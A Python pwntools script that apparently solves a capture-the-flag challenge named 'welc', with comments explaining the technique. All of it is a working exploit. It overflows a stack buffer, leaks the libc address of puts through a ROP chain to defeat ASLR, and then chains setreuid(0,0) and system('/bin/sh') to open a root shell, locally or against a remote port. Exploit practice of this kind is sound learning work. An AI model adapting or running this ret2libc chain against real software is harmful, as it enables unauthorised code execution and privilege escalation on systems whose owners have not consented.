#!/usr/bin/env python

from pwn import *

context.arch = "x86_64" # i forgot this for a while and was getting some craziness with my rop chain -.-
get_flag = False
chall_name = 'welc'

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main
    b *main+67
    b *_start''')

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    """
    A classic stack overflow. The binary has no stack canaries or PIE, 
    we assume ASLR enabled because we get a libc file with the challenge.
    
    First, leak the address of puts in libc, to do this we dont need a leak
    because without PIE we know wheres everything in the binary. 
    With the leak, we can have anything from libc, so we restart the binary
    (because we need to get the leak and use the leak in a second overflow),
    and ret2libc to call system('/bin/sh') or whatever we want.
    """
        
    binary = ELF(chall_name)
    puts_plt = p64(binary.symbols['puts']) # getting puts address from @plt
    puts_got = p64(0x40106b + 0x2fad) # puts rip when in plt + offset of indirect jmp, should point to puts inside libc
    start_addr = p64(binary.symbols['_start']) # getting _start main

    # searching for ROP gadgets, this 'rop' object will be useful ahead too
    rop = ROP('./' + chall_name)
    pop_rdi = p64(rop.rdi.address)

    ##### STAGE 1 - LEAKING LIBC PUTS ADDRESS AND BYPASS ASLR #######
    overflow_until_ret = b'A' * cyclic_find('raaaaaaa', n=8)

    """
    Here we create a rop chain in the 'old way'
    """
    xpl = b''
    xpl += overflow_until_ret
    # leaking puts libc address by using puts
    xpl += pop_rdi + puts_got # putting in rdi the addrs for puts from the got, the libc resolved guy
    xpl += puts_plt # puts plt addrs used to print the address in puts_got, leaking puts from libc
    xpl += start_addr # calling _start to rerun the binary and overflow again with something more useful
    
    print(p.recvrepeat(1).decode())
    p.sendline(xpl)

    memory_leak = p.recvline().strip()
    puts_leak = u64(memory_leak.ljust(8, b"\x00")) # adjusting the leak
    # calculating and setting libc base
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # chante to remote version
    puts_libc_offset = libc.sym.puts
    libc_base = puts_leak - puts_libc_offset # calculating the base with the leak
    libc.address = libc_base # setting the base for our object
    # now we can get address easily like this
    print('Leaked puts', hex(puts_leak))
    print('System address', hex(libc.sym.system))
    print('/bin/sh address', hex(next(libc.search(b'/bin/sh'))))

    ##### STAGE 2 - PWWWNINGGG #######
    """
    Here we create a rop chain using the power of pwntools
    """
    # i need a empty ret address here because the movaps instrunction in system will trigger
    # a sigsev because of the ABI rule. The rule says that the stack has to be aligned to 16 bytes
    # before doing a call (more research needed on this)
    # https://newbedev.com/why-does-the-mac-abi-require-16-byte-stack-alignment-for-x86-32
    rop.raw(rop.ret.address)
    rop.call(libc.sym.setreuid, [0, 0])
    rop.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])
    print(rop.dump())

    input('Press enter to pwn...')
    print(p.recvrepeat(1).decode())

    p.sendline(overflow_until_ret + rop.chain())
    print('Enjoy the shell')
    p.interactive()
    p.close()

if get_flag:
    p = remote('127.0.0.1', '30138')
    run_exploit(p, False)
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, False)
